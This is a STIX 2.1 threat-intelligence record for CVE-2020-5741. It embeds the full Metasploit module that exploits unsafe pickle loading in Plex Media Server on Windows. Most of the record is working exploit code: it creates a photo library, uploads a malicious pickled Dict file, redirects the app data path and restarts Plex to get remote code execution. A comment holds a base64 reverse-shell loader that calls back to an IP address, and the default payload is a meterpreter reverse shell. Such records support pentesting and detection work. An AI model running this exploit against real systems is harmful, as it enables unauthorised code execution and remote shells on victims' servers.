{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c2cb3a5-f16e-4e2f-a7ad-0557bcd20135",
    "created": "2024-08-14T16:54:16.563938Z",
    "modified": "2024-08-14T16:54:16.563942Z",
    "name": "Plex Unpickle Dict Windows RCE",
    "description": " This module exploits an authenticated Python unsafe pickle.load of a Dict file.  An authenticated attacker can create a photo library and add arbitrary files to it.  After setting the Windows only Plex variable LocalAppDataPath to the newly created photo library, a file named Dict will be unpickled, which causes an RCE as the user who started Plex. Plex_Token is required, to get it you need to log-in through a web browser, then check the requests to grab the X-Plex-Token header.  See info -d for additional details. If an exploit fails, or is cancelled, Dict is left on disk, a new ALBUM_NAME will be required as subsuquent writes will make Dict-1, and not execute.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/plex_unpickle_dict_rce.rb",
            "external_id": "plex_unpickle_dict_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/tenable/poc/blob/master/plex/plex_media_server/auth_dict_unpickle_rce_exploit_tra_2020_32.py"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/security/research/tra-2020-32"
        },
        {
            "source_name": "reference",
            "url": "http://support.plex.tv/articles/201105343-advanced-hidden-server-settings/"
        },
        {
            "source_name": "reference",
            "url": "https://forums.plex.tv/t/security-regarding-cve-2020-5741/586819"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5741"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Plex Unpickle Dict Windows RCE',\n        'Description' => %q{\n          This module exploits an authenticated Python unsafe pickle.load of a Dict file.  An authenticated attacker\n          can create a photo library and add arbitrary files to it.  After setting the Windows only Plex variable\n          LocalAppDataPath to the newly created photo library, a file named Dict will be unpickled, which causes\n          an RCE as the user who started Plex.\n          Plex_Token is required, to get it you need to log-in through a web browser, then check the requests to grab\n          the X-Plex-Token header.  See info -d for additional details.\n          If an exploit fails, or is cancelled, Dict is left on disk, a new ALBUM_NAME will be required\n          as subsuquent writes will make Dict-1, and not execute.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Chris Lyne' # discovery, POC\n        ],\n        'References' => [\n          ['URL', 'https://github.com/tenable/poc/blob/master/plex/plex_media_server/auth_dict_unpickle_rce_exploit_tra_2020_32.py'],\n          ['URL', 'https://www.tenable.com/security/research/tra-2020-32'],\n          ['URL', 'http://support.plex.tv/articles/201105343-advanced-hidden-server-settings/'],\n          ['URL', 'https://forums.plex.tv/t/security-regarding-cve-2020-5741/586819'],\n          ['CVE', '2020-5741']\n        ],\n        'Platform' => ['python'],\n        'Privileged' => false,\n        'Arch' => [ARCH_PYTHON],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'python/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_RESTARTS], # we reboot the server twice\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES] # we attempt to revert config changes\n        },\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-05-07',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(32400),\n        OptString.new('PLEX_TOKEN', [true, 'Admin Authenticated X-Plex-Token', '']),\n        OptString.new('LIBRARY_PATH', [true, 'Path to write picture library to', 'C:\\\\Users\\\\Public']),\n        OptString.new('ALBUM_NAME', [true, 'Name of Album', '']),\n        OptInt.new('REBOOT_SLEEP', [true, 'Time to wait for Plex to restart', 15])\n      ]\n    )\n  end\n\n  def album_name\n    if @album_name.nil?\n      @album_name = datastore['ALBUM_NAME'].blank? ? rand_text_alphanumeric(6) : datastore['ALBUM_NAME']\n    end\n    @album_name\n  end\n\n  def create_photo_library\n    print_status('Adding new photo library')\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => '/library/sections',\n      'headers' =>\n        {\n          'X-Plex-Token' => datastore['PLEX_TOKEN'],\n          'Accept' => 'application/json'\n        },\n      'vars_get' =>\n        {\n          'name' => album_name,\n          'language' => 'en',\n          'agent' => 'com.plexapp.agents.none',\n          'location' => datastore['LIBRARY_PATH'],\n          'type' => 'photo',\n          'scanner' => 'Plex Photo Scanner'\n        }\n    )\n    # response:\n    # {\"MediaContainer\":{\"size\":1,\"Directory\":[{\"art\":\"/:/resources/photo-fanart.jpg\",\"composite\":\"/library/sections/-1/composite/1592441414\",\"thumb\":\"/:/resources/photo.png\",\"key\":\"7\",\"type\":\"photo\",\"title\":\"EvilLib2\",\"agent\":\"com.plexapp.agents.none\",\"scanner\":\"Plex Photo Scanner\",\"language\":\"en\",\"uuid\":\"95d3810f-8be0-497c-b6d4-170050f7ab30\",\"updatedAt\":1592441414,\"createdAt\":1592441414,\"enableAutoPhotoTags\":false,\"content\":true,\"directory\":true,\"contentChangedAt\":5135637678740750690,\"Location\":[{\"id\":7,\"path\":\"C:\\\\Users\\\\Public\"}]}]}}\n    # we need to pull ['MediaContainer']['Directory'][0]['key']\n    if res && res.code == 201 # 201 == Created\n      return res.get_json_document['MediaContainer']['Directory'][0]['key']\n    end\n\n    nil\n  end\n\n  def add_pickle(location)\n    print_status('Adding pickled Dict to library')\n    # This is the pickle code, generated on windows to ensure no cross platform\n    # issues were encountered\n    #######\n    # python (2.7 ships with Plex)\n    #######\n    # import pickle\n    #\n    # class EP(object):\n    #    def __init__(self):\n    #        pass\n    #    def __reduce__(self):\n    #        # for generating an approximately correct size and content, we use\n    #        # msfvenom -p python/meterpreter/reverse_tcp LPORT=9999 LHOST=192.168.0.1\n    #        # that payload is then added after runsource.\n    #        # The original pre-meterp return would be\n    #        # return (eval, (\"__import__('code').InteractiveInterpreter().runsource(, '<input>', 'exec')\",))\n    #        return (eval, (\"__import__('code').InteractiveInterpreter().runsource(\\\"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMC4xJyw5OTk5KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')[0]))\\\", '<input>', 'exec')\",))\n    #\n    # e = EP()\n    # pickle.dumps(e)\n\n    # The output from that command will look similar to the following:\n    # 'c__builtin__\\neval\\np0\\n(S\\'__import__(\\\\\\'code\\\\\\').InteractiveInterpreter().runsource(\"exec(__import__(\\\\\\'base64\\\\\\').b64decode(__import__(\\\\\\'codecs\\\\\\').getencoder(\\\\\\'utf-8\\\\\\')(\\\\\\'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMC4xJyw5OTk5KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==\\\\\\')[0]))\", \\\\\\'<input>\\\\\\', \\\\\\'exec\\\\\\')\\'\\np1\\ntp2\\nRp3\\n.'\n\n    p = %|c__builtin__\\neval\\np0\\n(S\\'|\n    p << %|__import__('code').InteractiveInterpreter().runsource(\"#{payload.encoded}\", '<input>', 'exec')|.gsub(\"'\", \"\\\\\\\\'\")\n    p << %(\\'\\np1\\ntp2\\nRp3\\n.) # rubocop changed the | to ( which to not match the last 2 lines...\n    filename = \"#{album_name}/Plex Media Server/Plug-in Support/Data/com.plexapp.system/\"\n\n    u = \"type=13&sectionID=3&locationID=#{location}&createdAt=1171387901&filename=#{URI.encode_www_form_component(filename)}\"\n    # using raw here because the encodings for the filename got really wacky when using CGI\n    res = send_request_raw(\n      'method' => 'POST',\n      'uri' => \"/library/metadata?#{u}Dict\",\n      'headers' => { 'X-Plex-Token' => datastore['PLEX_TOKEN'] },\n      'ctype' => 'application/octet-stream',\n      'data' => p\n    )\n    if res && res.code == 401\n      fail_with(Failure::UnexpectedReply, 'Permission denied when attempting to upload file.  Plex server may not be registered to an account or you lack permission.')\n      delete_photo_library(location)\n      return false\n    end\n    # Deleting the file (even with a PrependFork) tended to kill the session or make it unreliable\n    # register_file_for_cleanup(\"#{datastore['LIBRARY_PATH']}\\\\#{filename.gsub('/', '\\\\\\\\')}Dict\")\n\n    if res && res.code == 401\n      fail_with(Failure::UnexpectedReply, 'Permission denied when attempting to upload file.  Plex server may not be registered to an account or you lack permission.')\n      delete_photo_library(location)\n      return false\n    end\n    true\n  end\n\n  def change_apppath(path)\n    print_status('Changing AppPath')\n    send_request_cgi(\n      'method' => 'PUT',\n      'uri' => '/:/prefs',\n      'vars_get' =>\n        {\n          'X-Plex-Token' => datastore['PLEX_TOKEN'],\n          'LocalAppDataPath' => path\n        }\n    )\n  end\n\n  def restart_plex\n    print_status('Restarting Plex')\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/:/plugins/com.plexapp.system/restart',\n      'vars_get' =>\n        {\n          'X-Plex-Token' => datastore['PLEX_TOKEN']\n        }\n    )\n  end\n\n  def delete_photo_library(library)\n    print_status('Deleting Photo Library')\n    send_request_cgi(\n      'method' => 'DELETE',\n      'uri' => \"/library/sections/#{library}\",\n      'vars_get' =>\n        {\n          'X-Plex-Token' => datastore['PLEX_TOKEN']\n        }\n    )\n  end\n\n  def ret_server_info\n    print_status('Gathering Plex Config')\n    res = send_request_cgi(\n      'uri' => '/',\n      'headers' => { 'X-Plex-Token' => datastore['PLEX_TOKEN'] }\n    )\n    unless res && res.code == 200\n      return nil\n    end\n\n    return Hash.from_xml(res.body)\n  end\n\n  def check\n    server = ret_server_info\n    if server.nil?\n      return CheckCode::Safe('Could not connect to the web service, check URI Path and IP')\n    end\n\n    store_loot('plex.json', 'application/json', datastore['RHOST'], server.to_s, 'plex.json', 'Plex Server Configuration')\n\n    report_host({\n      host: datastore['RHOST'],\n      os_name: server['MediaContainer']['platform'],\n      os_flavor: server['MediaContainer']['platformVersion']\n    })\n    print_status(\"Server Name: #{server['MediaContainer']['friendlyName']}\")\n    unless server['MediaContainer']['platform'] == 'Windows'\n      print_bad(\"Server OS: #{server['MediaContainer']['platform']} (#{server['MediaContainer']['platformVersion']})\")\n      return CheckCode::Safe('Only Windows OS is exploitable')\n    end\n    print_good(\"Server OS: #{server['MediaContainer']['platform']} (#{server['MediaContainer']['platformVersion']})\")\n    v = Rex::Version.new(server['MediaContainer']['version'])\n    if v >= Rex::Version.new('1.19.3')\n      print_bad(\"Server Version: #{v}\")\n      return CheckCode::Safe('Only < 1.19.3 is exploitable')\n    end\n    print_good(\"Server Version: #{server['MediaContainer']['version']}\")\n    unless server['MediaContainer']['allowCameraUpload']\n      print_bad(\"Camera Upload: #{server['MediaContainer']['allowCameraUpload']}\")\n      return CheckCode::Safe('Camera Upload not enabled')\n    end\n    print_good(\"Camera Upload: #{server['MediaContainer']['allowCameraUpload']}\")\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    if datastore['PLEX_TOKEN'].blank?\n      fail_with(Failure::BadConfig, 'PLEX_TOKEN is required.')\n    end\n\n    unless check == CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, 'Server not vulnerable')\n    end\n\n    print_status(\"Using album name: #{album_name}\")\n    id = create_photo_library\n    if id.nil?\n      fail_with(Failure::UnexpectedReply, 'Unable to create photo library, possible permission problem')\n    end\n    print_good(\"Created Photo Library: #{id}\")\n    success = add_pickle(id)\n    unless success\n      fail_with(Failure::UnexpectedReply, 'Unable to upload files to library')\n    end\n    change_apppath(\"#{datastore['LIBRARY_PATH']}\\\\#{album_name}\")\n    restart_plex\n    print_status(\"Sleeping #{datastore['REBOOT_SLEEP']} seconds for server restart\")\n    Rex.sleep(datastore['REBOOT_SLEEP'])\n    print_status('Cleanup Phase: Reverting changes from exploitation')\n    change_apppath('')\n    restart_plex\n    delete_photo_library(id)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-07",
    "x_mitre_platforms": [
        "['python']"
    ]
}